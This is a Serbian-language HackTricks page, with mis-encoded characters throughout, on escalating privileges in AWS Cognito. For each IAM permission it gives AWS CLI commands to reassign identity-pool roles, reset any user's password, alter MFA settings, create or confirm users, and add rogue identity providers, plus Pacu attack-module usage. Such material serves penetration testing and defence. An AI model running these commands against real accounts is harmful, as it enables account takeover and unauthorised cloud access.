# AWS - Cognito Privilegije

{% hint style="success" %}
U캜ite i ve쬭ajte hakovanje AWS-a:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
U캜ite i ve쬭ajte hakovanje GCP-a: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Cognito

Za vi코e informacija o Cognitu proverite:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Prikupljanje akreditacija iz Identity Pool-a

Po코to Cognito mo쬰 dodeliti **IAM ulogu akreditacije** kako **autentifikovanim** tako i **neautentifikovanim** **korisnicima**, ako prona캠ete **Identity Pool ID** aplikacije (trebalo bi da je hardkodiran u njoj) mo쬰te dobiti nove akreditacije i time privesc (unutar AWS naloga gde verovatno prethodno niste imali nikakve akreditacije).

Za vi코e informacija [**proverite ovu stranicu**](../aws-unauthenticated-enum-access/#cognito).

**Potencijalni Uticaj:** Direktan privesc na ulogu usluga povezanu sa neautentifikovanim korisnicima (i verovatno na onu povezanu sa autentifikovanim korisnicima).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Sa ovom dozvolom mo쬰te **dodeliti bilo koju cognito ulogu** autentifikovanim/neautentifikovanim korisnicima cognito aplikacije.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
Ako **aplikacija Cognito nema omogu캖ene neautentifikovane korisnike**, mo쬯a 캖e vam biti potrebna i dozvola `cognito-identity:UpdateIdentityPool` da biste je omogu캖ili.

**Potencijalni uticaj:** Direktno podizanje privilegija na bilo koju Cognito ulogu.

### `cognito-identity:update-identity-pool`

Napada캜 sa ovom dozvolom mo쬰 postaviti, na primer, Cognito korisni캜ki bazen pod svojom kontrolom ili bilo koji drugi pru쬬lac identiteta gde se mo쬰 prijaviti kao **na캜in pristupa ovom Cognito Identity Pool-u**. Zatim, samo **prijavljivanje** na taj pru쬬lac korisnika 캖e mu **omogu캖iti pristup konfigurisanoj autentifikovanoj ulozi u Identity Pool-u**.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
Tako캠e je mogu캖e **zloupotrebiti ovu dozvolu kako bi se omogu캖ila osnovna autentikacija**:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Potencijalni uticaj**: Kompromitovanje konfigurisanog autentifikovanog IAM uloge unutar bazena identiteta.

### `cognito-idp:AdminAddUserToGroup`

Ova dozvola omogu캖ava **dodavanje Cognito korisnika u Cognito grupu**, stoga napada캜 mo쬰 zloupotrebiti ovu dozvolu da doda korisnika pod svojom kontrolom u druge grupe sa **boljim** privilegijama ili **razli캜itim IAM ulogama**:
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Potencijalni uticaj:** Privesc na druge Cognito grupe i IAM uloge povezane sa grupama baziranim na bazama korisnika.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Napada캜 sa ovim dozvolama bi mogao **da kreira/a쬿rira grupe** sa **svakom IAM ulogom koja mo쬰 biti kori코캖ena od strane kompromitovanog Cognito Identity Providera** i da kompromitovanog korisnika u캜ini delom grupe, pristupaju캖i svim tim ulogama:

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**Potencijalni uticaj:** Eskalacija privilegija na druge Cognito IAM uloge.

### `cognito-idp:AdminConfirmSignUp`

Ova dozvola omogu캖ava **potvrdu registracije**. Podrazumevano, svako mo쬰 da se prijavi na Cognito aplikacije, ako se to ostavi, korisnik bi mogao da napravi nalog sa bilo kojim podacima i da ga potvrdi ovom dozvolom.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Potencijalni uticaj:** Indirektno eskaliranje privilegija ka IAM ulozi baziranom na identitetu za autentifikovane korisnike ako mo쬰te registrovati novog korisnika. Indirektno eskaliranje privilegija ka drugim funkcionalnostima aplikacije omogu캖avaju캖i potvrdu bilo kog naloga.

### `cognito-idp:AdminCreateUser`

Ova dozvola bi omogu캖ila napada캜u da kreira novog korisnika unutar bazena korisnika. Novi korisnik je kreiran kao omogu캖en, ali 캖e morati da promeni svoju lozinku.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Potencijalni uticaj:** Direktno privesc na IAM ulogu baziranu na bazenu identiteta za autentifikovane korisnike. Indirektno privesc na druge funkcionalnosti aplikacije omogu캖avaju캖i kreiranje bilo kog korisnika

### `cognito-idp:AdminEnableUser`

Ova dozvola mo쬰 pomo캖i u vrlo specifi캜nom scenariju gde napada캜 prona캠e akreditacije onemogu캖enog korisnika i treba da ga **ponovo omogu캖i**.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Potencijalni uticaj:** Indirektno privesc do IAM uloge bazena identiteta za autentifikovane korisnike i dozvola korisnika ako napada캜 ima akreditive za onemogu캖enog korisnika.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

Ova dozvola omogu캖ava prijavljivanje sa [**metodom ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**.** Za vi코e informacija pratite link.

### `cognito-idp:AdminSetUserPassword`

Ova dozvola bi omogu캖ila napada캜u da **promeni 코ifru bilo kog korisnika**, 캜ime bi mogao da se predstavi kao bilo koji korisnik (koji nema omogu캖enu MFA).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Potencijalni Uticaj:** Direktno privesc mo쬰 dovesti do potencijalnog pristupa bilo kom korisniku, omogu캖avaju캖i pristup svim grupama kojima korisnik pripada i pristup ulozi IAM-a koja je autentifikovana preko Pula identiteta.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: Napada캜 bi potencijalno mogao zloupotrebiti ovu dozvolu kako bi postavio mobilni telefon pod svojom kontrolom kao **SMS MFA korisnika**.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** Sli캜no kao prethodno, ova dozvola mo쬰 se koristiti za postavljanje MFA postavki korisnika kako bi se zaobi코la MFA za코tita.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: Sli캜no prethodnom, ova dozvola mo쬰 se koristiti za postavljanje MFA postavki bazena korisnika kako bi se zaobi코la MFA za코tita.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** Tako캠e je mogu캖e a쬿rirati korisni캜ki bazen kako bi se promenila MFA politika. [Proverite cli ovde](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Potencijalni uticaj:** Indirektno preuzimanje privilegija ka potencijalno bilo kom korisniku 캜ije kredencijale napada캜 poznaje, 코to bi omogu캖ilo zaobila쬰nje MFA za코tite.

### `cognito-idp:AdminUpdateUserAttributes`

Napada캜 sa ovla코캖enjem mo쬰 promeniti email ili broj telefona ili bilo koji drugi atribut korisnika pod svojom kontrolom kako bi poku코ao da stekne vi코e privilegija u podre캠enoj aplikaciji.\
Ovo omogu캖ava promenu emaila ili broja telefona i postavljanje kao verifikovano.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Potencijalni uticaj:** Potencijalno indirektno eskaliranje privilegija u osnovnoj aplikaciji kori코캖enjem Cognito korisni캜kog bazena koji dodeljuje privilegije na osnovu atributa korisnika.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Napada캜 sa ovla코캖enjem mo쬰 **kreirati novog klijenta bazena korisnika manje ograni캜enog** od ve캖 postoje캖ih klijenata bazena. Na primer, novi klijent mo쬰 dozvoliti bilo koji metod autentifikacije, ne mora imati nikakav tajni klju캜, mo쬰 imati onemogu캖eno opozivanje tokena, dozvoliti da tokeni budu va쬰캖i du쬰 vreme...

Isto se mo쬰 uraditi i ako se umesto kreiranja novog klijenta, **modifikuje postoje캖i**.

U [**komandnoj liniji**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (ili [**update opciji**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) mo쬰te videti sve opcije, proverite!.
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Potencijalni uticaj:** Potencijalna indirektna eskalacija privilegija ka korisniku autorizovanom za bazen identiteta kori코캖enjem bazena korisnika stvaranjem novog klijenta koji opu코ta sigurnosne mere i omogu캖ava napada캜u da se prijavi sa korisnikom kog je uspeo da kreira.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Napada캜 bi mogao zloupotrebiti ovu dozvolu da kreira korisnike otpremanjem CSV datoteke sa novim korisnicima.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
**Potencijalni uticaj:** Direktno privesc na IAM ulogu baziranu na bazenu identiteta za autentifikovane korisnike. Indirektno privesc na druge funkcionalnosti aplikacije omogu캖avaju캖i kreiranje bilo kog korisnika.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

Napada캜 bi mogao da kreira novog provajdera identiteta kako bi zatim mogao **da se prijavi putem ovog provajdera**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Potencijalni uticaj:** Direktno privesciranje na IAM ulogu baziranu na bazenu identiteta za autentifikovane korisnike. Indirektno privesciranje na druge funkcionalnosti aplikacije omogu캖avaju캖i kreiranje bilo kog korisnika.

### Analiza cognito-sync:\*

Ovo je veoma 캜esta dozvola podrazumevana u ulogama Cognito bazena identiteta. 캛ak i ako zvezdica u dozvolama uvek izgleda lo코e (posebno kada dolazi od AWS-a), **dodeljene dozvole nisu super korisne sa perspektive napada캜a**.

Ova dozvola omogu캖ava 캜itanje informacija o kori코캖enju bazena identiteta i ID-ova identiteta unutar bazena identiteta (코to nije osetljiva informacija).\
ID-ovi identiteta mogu imati [**Skupove podataka**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html) dodeljene njima, koji predstavljaju informacije o sesijama (AWS ih defini코e kao **sa캜uvanu igru**). Mogu캖e je da ovo sadr쬴 neku vrstu osetljivih informacija (ali verovatno캖a je prili캜no niska). Na [**stranici enumeracije**](../aws-services/aws-cognito-enum/) mo쬰te prona캖i kako pristupiti ovim informacijama.

Napada캜 tako캠e mo쬰 koristiti ove dozvole da se **upi코e u Cognito strim koji objavljuje promene** na ovim skupovima podataka ili **lambda funkciju koja se pokre캖e na doga캠aje Cognito-a**. Nisam video da je ovo kori코캖eno, i ne bih o캜ekivao osetljive informacije ovde, ali nije nemogu캖e.

### Automatski Alati

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), okvir za eksploataciju AWS-a, sada uklju캜uje module "cognito\_\_enum" i "cognito\_\_attack" koji automatizuju enumeraciju svih Cognito resursa u nalogu i ozna캜avaju slabe konfiguracije, korisni캜ke atribute kori코tene za kontrolu pristupa, itd., i tako캠e automatizuju kreiranje korisnika (uklju캜uju캖i podr코ku za MFA) i privesciranje zasnovano na izmenjivim prilago캠enim atributima, korisni캜kim kredencijalima bazena identiteta, ulogama koje se mogu pretpostaviti u ID tokenima, itd.

Za opis funkcija modula pogledajte deo 2 [blog posta](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Za uputstva za instalaciju pogledajte glavnu [Pacu](https://github.com/RhinoSecurityLabs/pacu) stranicu.

#### Kori코캖enje

Primer kori코캖enja cognito\_\_attack za poku코aj kreiranja korisnika i svih vektora privesciranja protiv datog bazena identiteta i klijenta bazena korisnika:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Primer kori코캖enja cognito\_\_enum alata za prikupljanje svih bazena korisnika, klijenata bazena korisnika, identitetskih bazena, korisnika, itd. vidljivih u trenutnom AWS nalogu:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) je alatka u CLI formatu napisana u Python-u koja implementira razli캜ite napade na Cognito, uklju캜uju캖i eskalaciju privilegija.

#### Instalacija
```bash
$ pip install cognito-scanner
```
#### Upotreba
```bash
$ cognito-scanner --help
```
Za vi코e informacija pogledajte [https://github.com/padok-team/cognito-scanner](https://github.com/padok-team/cognito-scanner)

{% hint style="success" %}
U캜ite i ve쬭ajte hakovanje AWS-a:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
U캜ite i ve쬭ajte hakovanje GCP-a: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
